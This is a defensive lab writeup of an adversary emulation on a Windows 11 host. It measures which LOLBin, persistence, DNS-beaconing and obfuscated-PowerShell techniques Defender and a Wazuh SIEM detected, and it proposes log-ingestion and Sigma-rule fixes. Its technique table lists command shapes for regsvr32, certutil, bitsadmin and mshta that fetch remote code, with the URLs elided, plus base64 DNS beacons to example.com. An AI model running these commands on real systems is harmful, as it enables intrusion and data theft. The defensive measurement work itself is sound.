# 004 — LOLBin execution, and the two threats the SIEM never heard about

**Date:** 2026-09-17
**Type:** self-run adversary emulation on `WIN11-VICTIMA`, investigated from the SIEM
**Scope:** one unprivileged phase — everything an intruder can do in the first minute, before escalating
**ATT&CK:** T1059.001, T1105, T1218.010/.011/.005, T1071.004, T1547.001, T1053.005, T1082, T1087.001

## 0. Why this one is different

The first three investigations in this repository looked at noisy, low-severity activity: a port
scan, a password spray, a process tree running `whoami`. Useful for learning to read telemetry,
but nothing a SOC would lose sleep over.

This one ran ten post-exploitation techniques in a single unprivileged burst and then asked one
question: for each technique, what did the endpoint *see*, and what reached the *analyst*? The
gap between those two numbers turned out to be the finding. The endpoint's own antivirus caught
and quarantined two `Severe` trojans while the run was still going, and not one byte of that ever
arrived at the SIEM. An analyst watching the Wazuh dashboard during this attack would have seen
thirty generic "a process was created" alerts and a level-15 false positive, and would have had
no idea that Defender had just removed two threats from the same machine.

That is not a missing rule. It is a missing *log source*. This writeup is about how to tell those
two apart, because they look identical from the console — both are silence.

## 1. What was run

All ten techniques ran as the standard user `<LAB_USER>`, launched through `guestcontrol`, which
hands out a filtered (medium-integrity) token. That matters: it means everything here is what an
attacker gets from an initial foothold *before* privilege escalation. No admin.

Each command carried a unique marker string (`SIMFASE1`) so its telemetry could be isolated
afterwards without cross-contamination — the same watermarking method as investigation 002. The
window on the guest clock was 14:37:33–14:38:10 (17:37–17:38 UTC; the guest runs Argentina time,
UTC−3).

| # | Technique | ATT&CK | Command shape |
|---|---|---|---|
| 1 | Local discovery burst | T1082, T1087.001, T1016, T1057 | `whoami /all`, `net user`, `net localgroup Administrators`, `systeminfo`, `tasklist /svc`, `arp -a`, `netstat -ano`, `ipconfig /all`, `hostname` — nine commands in ~6 s |
| 2 | Run-key persistence | T1547.001 | `HKCU\...\CurrentVersion\Run` |
| 3 | Scheduled task | T1053.005 | `schtasks /create ... /sc onlogon` |
| 4 | rundll32 | T1218.011 | `rundll32 url.dll,FileProtocolHandler https://…` |
| 5 | regsvr32 (Squiblydoo) | T1218.010 | `regsvr32 /s /n /u /i:https://…/SIMFASE1.sct scrobj.dll` |
| 6 | mshta | T1218.005 | `mshta https://…/SIMFASE1.hta` |
| 7 | certutil download | T1105 | `certutil -urlcache -split -f https://…` |
| 8 | bitsadmin download | T1105 | `bitsadmin /transfer … /download …` |
| 9 | DNS beaconing | T1071.004 | five lookups of `<base64>.SIMFASE1.example.com` |
| 10 | Obfuscated PowerShell | T1059.001 | `-EncodedCommand`, string concat + `scriptblock`, reversed string |

The `.example.com` domain is reserved by RFC 2606 and does not resolve, so the beaconing produced
DNS *queries* on the host without any traffic leaving to a real destination.

## 2. What the endpoint did about it — before the SIEM was even in the picture

Microsoft Defender is on by default on this host (real-time protection, behaviour monitoring and
tamper protection all enabled). During the run it fired five events in its own operational log:

| Time (UTC) | Event | Threat | Command it matched | Action |
|---|---|---|---|---|
| 17:37:48 | 1116 (detected) | `Trojan:Win32/Powemet.A!attk` | the `regsvr32 … scrobj.dll` line | — |
| 17:37:54 | 1116 (detected) ×2 | `Trojan:Win32/Ceprolad.A` | the `certutil -urlcache …` line | — |
| 17:38:15 | 1117 (remediated) | Powemet | regsvr32 line | **Remove** |
| 17:38:29 | 1117 (remediated) | Ceprolad | certutil line | **Remove** |

Two details are worth stopping on.

First, look at what Defender matched. The event's `Path` field is not a file — it reads
`CmdLine:_C:\Windows\System32\certutil.exe -urlcache -split -f https://…`. **Defender detected on
the command line, not on a payload.** Nothing malicious was ever downloaded; the `certutil` fetch
failed and the `regsvr32` scriptlet URL was never reachable. The signature is on the *invocation*.
That is behavioural/AMSI detection, and it has two consequences that pull in opposite directions:
it is robust — it fires even when the download fails — and it is brittle — it is evaded by
rewriting the command line or reaching for a LOLBin Microsoft has not signatured. Which is exactly
what the next point shows.

Second, look at what Defender *let through*. `rundll32 url.dll,FileProtocolHandler` and `mshta`
both launched without a murmur. So did the nine-command discovery burst, the five DNS beacons, and
all three obfuscated-PowerShell variants. The two techniques Defender killed were the two with the
most notorious, most-signatured command lines. The rest of the attack ran to completion.

And one thing Defender had nothing to do with: the scheduled task (`schtasks`) failed with *Access
is denied*, and there is **no** Defender event for it. That failure was the filtered token, not the
antivirus. Same error text on screen, completely different cause — a distinction that matters when
you are reconstructing what actually stopped an attacker.

## 3. What reached the analyst

The agent forwards Security, Sysmon, PowerShell, Application and System. Over the attack window
those channels produced **354 events**:

| Channel | Events | Top event IDs |
|---|---|---|
| Security | 82 | 4688 ×30, 4689 ×29, 4624 ×7, 4672 ×5, **4799 ×5**, **4798 ×2**, 4648 ×2 |
| Sysmon | 38 | EID 1 ×23, **EID 22 ×5**, EID 11 ×4, **EID 8 ×3**, EID 3 ×2, EID 13 ×1 |
| PowerShell | 234 | 4103 ×190, 4104, 4105/4106 |

Those 354 events became **50 Wazuh alerts**:

| Rule | Count | Level | What it says |
|---|---|---|---|
| 67027 | 30 | 3 | A process was created |
| 60118 / 67023 | 8 | 3 | Logon / logoff |
| **92213** | **3** | **15** | Executable dropped in a folder used by malware — *the false positive* |
| 67028 | 2 | 3 | Special privileges assigned |
| 92031 / 92033 | 4 | 3 | Discovery activity |
| 91815 | 1 | 4 | PowerShell process discovery |
| **92057** | **1** | **12** | PowerShell spawned PowerShell running base64 |

The single most severe alert of the whole attack — level 15 — is rule 92213 firing on
`__PSScriptPolicyTest_*.ps1`, a temp file that PowerShell writes to test its own execution policy.
It is benign. This lab has now watched that exact false positive fire on 2026-08-08, 2026-08-11,
2026-09-07 and again here: **four separate reconfirmations**. The genuinely malicious moment of
this attack — obfuscated PowerShell running a base64 command — alerted at level 12, one rung below
the noise. Anyone triaging this queue top-down by severity spends their attention on PowerShell's
housekeeping and reaches the real thing last.

## 4. The three gaps, measured

**Gap 1 — the SIEM is deaf to its own antivirus.** This is the headline. Defender detected and
remediated two `Severe` trojans (§2). A query of the entire alert index for Defender event IDs
1116/1117/1121/1122 returns **zero documents — ever**. The list of channels that have produced any
alert in this lab's history is Security, Sysmon, Application, PowerShell, System. The Defender
operational channel is not on it. The endpoint's most authoritative verdict — *"I found malware and
I removed it"* — never reaches the person paid to notice malware.

**Gap 2 — DNS beaconing.** Five DNS lookups with base64-looking subdomains produced five Sysmon
event ID 22 records and **zero** alerts. This channel was already known to have no detection
coverage (investigation 002); the attack confirms it against real beaconing-shaped traffic.

**Gap 3 — local group enumeration.** `net localgroup Administrators` and friends produced
5× event 4799 and 2× event 4798 — the exact events a tool like SharpHound generates while mapping
who is privileged — and **zero** alerts. The discovery *burst* did alert (rules 92031/92033), but
on the process-creation side, not on the enumeration itself.

A fourth, smaller one: Sysmon event ID 8 (CreateRemoteThread) fired three times and drew no alert.
I did not expect it and have not yet traced which step produced it. It is logged as an open thread,
not a claim.

Two incidental findings from the run, both worth an interviewer's time:
- **`wmic.exe` no longer exists** in System32 on this build (Windows 11 25H2, 26200). Microsoft has
  removed it. Any detection or runbook that keys on `wmic` is dead on modern Windows; the equivalent
  is `Get-CimInstance` / `Invoke-CimMethod`.
- My own attack script reported success creating an `HKCU\…\Run` value that was never created,
  because the key did not exist on a profile that never had a startup item and the script lacked
  `-ErrorAction Stop`. A script that claims success while doing nothing is the same failure this
  repository documents for `Sysmon64 -i` in `lab/README.md`. Noted, and the script was fixed.

## 5. What this means if it were real

Strip out the lab framing. An attacker lands on a workstation through a phished document. In the
first sixty seconds they enumerate the box, try to persist, and pull a second-stage tool with
`certutil`. On this endpoint, Defender eats the `certutil` and `regsvr32` stages, which is a real
win — defence in depth working exactly as intended. But the attacker still has: full local recon,
a working DNS channel out, and obfuscated PowerShell execution. And the defender's SIEM shows the
shift lead a wall of level-3 "process created" noise and a recurring level-15 false alarm.

The dangerous version of this is not the attack that beats the antivirus. It is the attack the
antivirus *stops* — because if the AV's verdict never reaches the SIEM, the SOC has no signal that
this machine was even targeted. Defender quarantining a trojan is precisely the moment a human
should look at that host: something put malware there, and whatever put it there is probably still
running (the discovery, the DNS channel). The remediation event is not the end of the incident. It
is the start of one. A SOC that cannot see remediation events is a SOC that only investigates the
attacks its own AV failed to stop.

## 6. How to counter it

Ordered by value, cheapest and highest-impact first.

**6.1 — Ingest the Defender channel. (Configuration, not detection.)**
The single most valuable change on this page. Add the operational channel to the agent's
`ossec.conf` so the AV's own verdicts become searchable and alertable:

```xml
<localfile>
  <location>Microsoft-Windows-Windows Defender/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

Wazuh's stock ruleset already scores Defender 1116/1117 once the events arrive, so this one edit
turns "invisible" into "alerted" with no rule authoring at all. This is the fix for Gap 1, and it
is the difference between the story in §5 and a SOC that gets paged the moment the AV fires.

**6.2 — Detect the LOLBin download yourself.** Do not let the AV be the *only* thing that sees
`certutil -urlcache` and `regsvr32 /i:http`. An attacker who disables or tampers with Defender
(and tamper events are themselves a signal, once §6.1 is done) should still trip a SIEM rule that
keys on the command line. Rule: `proc_creation_win_lolbin_remote_download.yml`.

**6.3 — Detect DNS beaconing.** A DNS query whose leftmost label is long and high-entropy, issued
by a process that has no business resolving names, is the shape of data-over-DNS. Rule:
`dns_query_win_high_entropy_subdomain.yml`, on Sysmon event ID 22. Closes Gap 2.

**6.4 — Detect local-group enumeration.** Event 4798/4799 in a short burst from one process is
reconnaissance of who is privileged. Rule: `win_security_local_group_enumeration.yml`. Closes Gap 3.

**6.5 — Finally tune 92213.** Four false-positive reconfirmations is three too many. The
`__PSScriptPolicyTest_*.ps1` exclusion is already written
(`detections/sigma/file_event_win_executable_dropped_excluding_psscriptpolicytest.yml`); this run
is the evidence that it needs to be deployed, not just drafted.

The four Sigma rules are in `detections/sigma/`. None is deployed to the manager yet — the same
honest status as every other rule in this repository — but all parse under `sigma check` and
convert to an OpenSearch query. Deploying and re-measuring is the next step, and it is the one that
turns "drafted" into a number.

## 7. Honest limits

- This was one unprivileged phase. Credential access (LSASS), service creation, log clearing and
  the ransomware precursor `vssadmin delete shadows` all need an elevated, interactive session and
  are the subject of a separate run.
- Defender being enabled means this run tested *two* controls at once — the AV and the SIEM. That
  is realistic, but it means "the attack was stopped" and "the SIEM detected the attack" are
  different statements here, and I have kept them separate on purpose.
- The Defender-ingestion fix (§6.1) is written but not yet applied to the lab; applying it needs
  admin on the endpoint, which this phase did not have.
- Sysmon event ID 8 (§4) is reported without a root cause. It is a lead, not a conclusion.

## 8. ATT&CK coverage from this run

| Technique | Ran | AV stopped it | Telemetry generated | SIEM alerted |
|---|---|---|---|---|
| T1082 / T1087.001 discovery | yes | no | 4688, 4798/4799 | partial (process side only) |
| T1547.001 Run key | attempted | no | — | no (key absent, see §4) |
| T1053.005 scheduled task | blocked (token) | no | — | no |
| T1218.011 rundll32 | yes | **no** | Sysmon 1 | no |
| T1218.010 regsvr32 | **blocked (AV)** | **yes** | Defender 1116/1117 | **no (channel not ingested)** |
| T1218.005 mshta | yes | no | Sysmon 1 | no |
| T1105 certutil | **blocked (AV)** | **yes** | Defender 1116/1117 | **no (channel not ingested)** |
| T1071.004 DNS beacon | yes | no | Sysmon 22 ×5 | no |
| T1059.001 obfuscated PS | yes | no | 4104, Sysmon 1 | yes (rule 92057, level 12) |
